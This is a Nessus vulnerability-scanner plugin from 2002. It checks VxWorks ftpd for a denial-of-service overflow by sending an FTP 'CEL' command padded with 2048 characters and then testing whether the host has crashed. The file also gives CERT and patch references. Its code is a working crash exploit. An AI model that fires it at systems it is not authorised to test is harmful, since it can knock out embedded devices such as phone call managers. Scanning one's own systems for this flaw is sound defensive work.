# This script derived from aix_ftpd by Michael Scheidell at SECNAP
#
# original script  written by Renaud Deraison <deraison@cvs.nessus.org>
# 
# See the Nessus Scripts License for details
#
# References:
# From: "Michael S. Scheidell" <Scheidell@secnap.com>
# Subject: [VU#317417] Denial of Service condition in vxworks ftpd/3com nbx
# To: "BugTraq" <bugtraq@securityfocus.com>, <security@windriver.com>,
#    <support@windriver.com>
# Date: Mon, 2 Dec 2002 13:04:31 -0500
#

if(description)
{
 script_id(11184);
 script_bugtraq_id(6297, 7480);
 script_version("$Revision: 1.6 $");
 
 name["english"] = "vxworks ftpd buffer overflow Denial of Service";
 
 script_name(english:name["english"]);
	     
 desc["english"] = "
It was possible to make the remote host
crash by issuing this FTP command :

	CEL aaaa(...)aaaa
	
This problem is similar to the 'aix ftpd' overflow
but on embedded vxworks based systems like the 3com
nbx IP phone call manager and seems to cause the server
to crash.

Solution: If you are using an embedded vxworks
product, please contact the OEM vendor and reference
WindRiver field patch TSR 296292. If this is the 
3com NBX IP Phone call manager, contact 3com.

This affects VxWorks ftpd versions 5.4 and 5.4.2

For more information, see CERT VU 317417
http://www.kb.cert.org/vuls/id/317417
or full security alert at
http://www.secnap.net/security/nbx001.html

Risk factor : High";
		 
 script_description(english:desc["english"]);
 
 script_summary(english:"Tries to CRASH VxWorks ftpd server with CEL overflow");
 script_category(ACT_KILL_HOST);
 script_family(english:"Denial of Service", francais:"Déni de service");

 
 script_copyright(english:"This script is Copyright (C) 2002 Michael Scheidell",
 		  francais:"Ce script est Copyright (C) 2002 Michael Scheidell");
		  
 script_dependencie("find_service.nes",
	"ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_require_keys("ftp/vxftpd");
 exit(0);
}

#
# The script code starts here : 
#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  buf = ftp_recv_line(socket:soc);
  if(!buf){
 	close(soc);
	exit(0);
	}
  start_denial();
  
  buf = string("CEL a\r\n");
  send(socket:soc, data:buf);
  r = recv_line(socket:soc, length:1024);
  if(!r)exit(0);
  
  buf = string("CEL ", crap(2048), "\r\n");
  send(socket:soc, data:buf);
  b = recv_line(socket:soc, length:1024);
  ftp_close(socket: soc);
  alive = end_denial();
  if(!b)security_hole(port);
  if(!alive)set_kb_item(name:"Host/dead", value:TRUE);
}

